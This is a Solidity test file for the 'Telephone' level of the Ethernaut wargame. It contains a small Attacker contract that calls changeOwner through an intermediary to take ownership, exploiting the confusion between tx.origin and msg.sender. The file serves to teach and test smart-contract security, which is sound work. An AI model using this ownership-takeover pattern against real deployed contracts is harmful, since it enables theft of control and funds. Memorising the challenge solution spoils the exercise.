// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Telephone} from "../levels/Telephone/Telephone.sol";
import {TelephoneFactory} from "../levels/Telephone/TelephoneFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract TelephoneTest is LevelTest {
    Telephone private level;

    constructor() {
        levelFactory = new TelephoneFactory();
    }

    function testTelephone() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Telephone(levelAddress);
        assertEq(level.owner(), address(levelFactory));
    }

    function exploit() internal override {
        vm.startPrank(player, player);
        new Attacker().run(level);
        vm.stopPrank();
    }
}

contract Attacker {
    function run(Telephone level) public {
        level.changeOwner(msg.sender);
    }
}
